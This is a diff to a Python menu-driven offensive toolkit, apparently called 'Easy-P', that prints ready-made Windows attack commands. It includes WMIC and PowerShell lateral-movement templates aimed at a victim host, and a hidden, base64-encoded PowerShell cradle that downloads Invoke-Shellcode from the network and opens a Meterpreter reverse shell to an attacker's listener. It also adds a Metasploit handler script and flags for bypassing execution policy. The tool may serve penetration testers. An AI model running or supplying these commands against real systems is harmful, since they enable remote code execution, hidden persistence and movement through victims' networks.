@@ -9,7 +9,6 @@ import os
 import getopt
 import subprocess as sp
 
-
 print "___________                              __________ "
 print "\_   _____/____    _________.__.         \______    \ "
 print "  |    __)_\__  \  /  ___<   |  |  ______  |     ___/"
@@ -108,7 +107,7 @@ def lat():
 	""")
 	ans=raw_input("What would you like to do: ") 
 	if ans=="1":
-		print 'wmic /authority:"Kerberos:[DOMAIN]\[HOST_FQDN]" /node:[HOST_FQDN] process call create "cmd /c [Command]"'
+		print 'wmic /authority:"Kerberos:[DOMAIN]\[HOSTNAME]" /node:[HOSTNAME] process call create "cmd /c [Command]"'
 		print 'Example: wmic /authority:"Kerberos:hacker.testlab\win8" /node:win8 process call create "cmd /c ping 127.0.0.1 > C:\log.txt"'
 	elif ans=="2":
 		print 'Powershell.exe Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "powershell.exe -enc [Base64 encoded string]" -ComputerName [victim IP] -Credential [Username]'
@@ -125,17 +124,31 @@ def metasploit():
 	print "\n[*]Base64 encoded version download and execute:"
 	x = powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force")
 	print "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + x
+	print "\n[*]Listner Resource Script (listener.rc) - Save the following to a file called listener.rc on your Kali box and load your handler with msfconsole -r listener.rc"
+	print "use multi/handler \nset payload windows/meterpreter/reverse_https \nset LHOST " + ans_lhost + "\nset LPORT " + ans_lport + "\nset ExitOnSession false \nexploit -j"
+
+def p101():
+	print "Powershell Flags:"
+	print "[*] -Exec Bypass : Bypass Security Execution Protection "
+	print "[*] -NonI : Noninteractive Mode - PowerShell does not present an interactive prompt to the user "
+	print "[*] -NoProfile : PowerShell console not to load the current user's profile"
+	print "[*] -W Hidden : Sets the window style for the session"
+	print "32bit Powershell Execution: powershell.exe -NoP -NonI -W Hidden -Exec Bypass"
+	print "64bit Powershell Execution: %WinDir%\syswow64\windowspowershell\\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass"
+	print 'Permanently change a users execution policy: powershell -exec bypass -noninteractive -w hidden -Command "& {Set-ExecutionPolicy Unrestricted -Scope CurrentUser}"'
 	
 	
 ans=True
 while ans:
 	print ("""
-	1.Privilege Escalation
-	2.Lateral Movement
-	3.Keylogging
-	4.PowerShell Meterpreter
-	5.Change Users Execution Policy
-	6.Exit/Quit
+                        ==Easy-P Menu System==
+                        1.Privilege Escalation
+                	2.Lateral Movement
+                	3.Keylogging
+                	4.PowerShell Meterpreter
+                	5.Change Users Execution Policy
+                	6.Powershell 101
+                	7.Exit/Quit
     """)
 	ans=raw_input("What would you like to do: ") 
 	if ans=="1":
@@ -151,4 +164,6 @@ while ans:
 		print 'This will permanently change the current users execution policy:'
 		print 'powershell -exec bypass -noninteractive -w hidden -Command "& {Set-ExecutionPolicy Unrestricted -Scope CurrentUser}"'
 	elif ans=="6":
+		p101()	
+	elif ans=="7":
 		sys.exit(0)
